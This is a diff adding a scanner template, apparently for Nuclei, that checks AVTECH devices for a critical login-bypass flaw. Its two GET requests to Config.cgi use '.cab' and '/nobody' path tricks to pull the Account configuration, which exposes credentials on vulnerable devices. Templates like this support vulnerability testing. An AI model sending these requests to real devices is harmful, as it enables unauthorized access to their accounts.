@@ -1,0 +1,24 @@
+id: AVTECH-login-bypass
+
+info:
+  name: AVTECH 登录绕过
+  author: Str1am
+  severity: critical
+  reference: https://www.seebug.org/vuldb/ssvid-92494
+  tags: AVTECH,login,bypass
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*"
+      - "{{BaseURL}}/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Account"
+        part: body
+        condition: and
